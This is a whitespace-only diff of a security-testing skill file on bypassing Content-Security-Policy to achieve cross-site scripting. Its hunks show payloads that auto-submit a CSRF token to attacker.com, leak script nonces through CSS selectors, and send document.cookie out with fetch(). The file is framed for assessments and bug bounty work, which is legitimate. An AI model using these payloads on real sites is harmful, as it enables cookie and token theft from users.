@@ -1,11 +1,11 @@
 ---
 name: performing-content-security-policy-bypass
 description: Analyze Content-Security-Policy headers and bypass them to achieve cross-site
-  scripting by exploiting unsafe-inline/unsafe-eval, whitelisted JSONP endpoints, base-uri
-  and form-action gaps, and nonce/hash weaknesses, then exfiltrate data even without
-  script-src control. Use during web application security assessments or bug bounty
-  hunting when XSS is found but blocked by CSP, or when auditing CSP header configuration
-  for weaknesses.
+ scripting by exploiting unsafe-inline/unsafe-eval, whitelisted JSONP endpoints, base-uri
+ and form-action gaps, and nonce/hash weaknesses, then exfiltrate data even without
+ script-src control. Use during web application security assessments or bug bounty
+ hunting when XSS is found but blocked by CSP, or when auditing CSP header configuration
+ for weaknesses.
 domain: cybersecurity
 subdomain: web-application-security
 tags:
@@ -125,7 +125,7 @@ curl -sI http://target.com | grep -i "content-security-policy-report-only"
 # If form-action is not restricted:
 # Steal data via form submission
 <form action="https://attacker.com/steal" method="POST">
-  <input name="csrf_token" value="">
+ <input name="csrf_token" value="">
 </form>
 <script>document.forms[0].submit()</script>
 
@@ -140,8 +140,8 @@ curl -sI http://target.com | grep -i "content-security-policy-report-only"
 # Nonce leaking via CSS attribute selectors
 # If attacker can inject HTML (but not script due to CSP nonce):
 <style>
-  script[nonce^="a"] { background: url("https://attacker.com/leak?nonce=a"); }
-  script[nonce^="b"] { background: url("https://attacker.com/leak?nonce=b"); }
+ script[nonce^="a"] { background: url("https://attacker.com/leak?nonce=a"); }
+ script[nonce^="b"] { background: url("https://attacker.com/leak?nonce=b"); }
 </style>
 # Brute-force each character position to leak the nonce
 
@@ -179,7 +179,7 @@ input[value^="b"] { background: url("https://attacker.com/?char=b"); }
 
 # Via connect-src (if allows external):
 <script nonce="valid">
-  fetch('https://attacker.com/steal?data=' + document.cookie);
+ fetch('https://attacker.com/steal?data=' + document.cookie);
 </script>
 
 # Via DNS prefetch:
